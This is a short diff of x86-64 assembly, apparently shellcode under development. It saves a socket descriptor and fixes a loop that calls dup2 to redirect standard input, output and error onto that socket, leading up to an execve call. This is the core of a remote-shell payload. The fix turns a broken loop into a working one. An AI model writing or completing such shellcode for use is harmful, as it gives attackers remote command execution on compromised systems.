@@ -51,18 +51,18 @@ _start:
     js      fail
 
     mov     r12, rdi           ; salva sockfd para o loop
+    xor     rbx, rbx           ; índice para dup2: 0, 1, 2
 
-    ; dup2 loop com debug a cada syscall
-    xor     rsi, rsi
 .loop:
-    mov     rdi, r12           ; recupera sockfd para dup2
-    mov     rax, 33
+    mov     rdi, r12           ; sockfd
+    mov     rsi, rbx           ; target fd
+    mov     rax, 33            ; syscall dup2
     syscall
     test    rax, rax
     js      fail
 
-    inc     rsi
-    cmp     rsi, 3
+    inc     rbx
+    cmp     rbx, 3
     jl      .loop
 
     ; debug: execve
